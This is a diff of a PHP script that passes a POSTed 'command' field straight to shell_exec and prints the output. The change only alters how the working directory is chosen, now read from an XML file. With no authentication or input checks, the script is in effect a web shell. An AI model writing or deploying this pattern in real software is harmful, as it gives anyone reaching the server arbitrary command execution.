@@ -3,13 +3,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $command = $_POST['command'] ?? '';
 
     if (!empty($command)) {
-        // Change directory to the server's desired directory
-        chdir('../'); // Replace with the actual path
+        // Read the directory path from the XML file
+        $filePath = 'directory.xml'; // Replace with the actual path to your XML file
 
-        // Execute the command on the server
-        $output = shell_exec($command);
-        
-        echo ($output !== null) ? htmlentities($output) : 'Command executed successfully.';
+        if (file_exists($filePath)) {
+            $xml = simplexml_load_file($filePath);
+            $directoryPath = (string) $xml->path;
+
+            // Check if the directory path exists and is a directory
+            if (is_dir($directoryPath)) {
+                chdir($directoryPath);
+                $output = shell_exec($command);
+                echo ($output !== null) ? htmlentities($output) : 'Command executed successfully.';
+            } else {
+                echo "Directory does not exist or is not valid: $directoryPath";
+            }
+        } else {
+            echo "XML file not found: $filePath";
+        }
     } else {
         echo 'No command provided.';
     }
